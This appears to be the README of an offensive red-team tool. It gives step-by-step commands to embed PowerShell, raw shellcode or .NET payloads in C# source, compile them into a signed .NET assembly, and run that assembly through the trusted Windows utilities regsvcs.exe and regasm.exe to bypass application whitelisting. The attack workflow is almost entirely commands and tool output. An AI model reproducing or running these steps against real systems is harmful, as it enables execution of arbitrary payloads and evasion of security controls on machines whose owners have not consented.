## Rogue .NET Assembly for Regsvcs/Regasm Code Execution

Follow below described steps to properly generate your source code and then compile it to a .NET Assembly valid for Regasm/Regsvcs:

### Step 1: Generate key.snk file

```
powershell -file build.ps1
```

### Step 2: Generate source code file

Included in this directory script is a helper utility allowing one to quickly generate desired csharp source code file to be used for further `csc` compilation.

Usage:

```
python3 generateRegsvcs.py --help

        :: Regsvcs Code Execution Source code generation utility
        To be used during Red-Team assignments to launch Powershell/Shellcode payloads via Regsvcs/Regasm.
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

usage: .\generateRegsvcs.py [options] <inputFile>

positional arguments:
  inputFile   Input file to be embeded within C# code. May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.

optional arguments:
  -h, --help  show this help message and exit
  -e, --exe   Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!
  -r, --raw   Specified input file is a raw Shellcode to be injected in self process in a separate Thread.
```

Sample use case:

```
python3 generateRegsvcs.py -r notepad64.bin > program.cs

        :: Regsvcs Code Execution Source code generation utility
        To be used during Red-Team assignments to launch Powershell/Shellcode payloads via Regsvcs/Regasm.
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

[?] File specified as raw Shellcode.

```

```
python3 generateRegsvcs.py -r payload.bin > program.cs
```

###  Step 3: Compilate library .NET Assembly

```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk program.cs
```
 
If you passed Powershell code to be launched in a .NET Runspace, then an additional assembly will have to be used to compile resulting source code properly - meaning System.Management.Automation.dll (provided with this script). Then proper compilation command will be:

```
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.Management.Automation.dll /target:library /out:regsvcs.dll /keyfile:key.snk program.cs
```


### Step 4: Code execution via Regsvcs or Regasm:

```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll
```
   or
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll
```
   or
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll 
```
   or
```
%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll
```
